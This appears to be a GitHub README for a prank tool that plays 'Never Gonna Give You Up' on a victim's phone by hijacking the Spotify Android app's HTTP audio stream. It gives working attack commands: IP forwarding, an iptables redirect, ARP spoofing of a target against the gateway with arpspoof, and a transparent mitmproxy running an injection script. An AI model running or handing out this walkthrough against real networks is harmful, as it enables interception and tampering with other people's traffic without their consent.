![](https://github.com/kjempelodott/rickify/blob/master/f9z.png)

The Spotify app for Android streams the first few seconds of a track over HTTP. Being on the same LAN as your target, this can easily be pwned. It turns out the Spotify app for Android will happily accept and play any Ogg-file.

**Notes:**
* This will not work with IPv6
* This will not work for already cached/downloaded tracks

## We know the game and we're gonna play it

Install the required tools:

```
apt-get install dsniff
pip install mitmproxy
```

## You know the rules and so do I

Turn on port forwarding and forward HTTP traffic to port 8080:

```
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## A full commitment's what I'm thinking of

Identify the gateway and the target IP address. Use Wireshark or whatever. Then trick your target device into sending all traffic to you instead of the gateway:

```
arpspoof -t [target ip] [gateway ip] # e.g. -t 192.168.1.101 192.168.1.1
```

## You wouldn't get this from any other guy

Get a copy of *Never Gonna Give You Up* in Ogg-format. You probably have to change the filename in line 3 in *rickroll.py*. Setup a transparent proxy on port 8080:

```
mitmproxy -T -p 8080 -s rickroll.py
```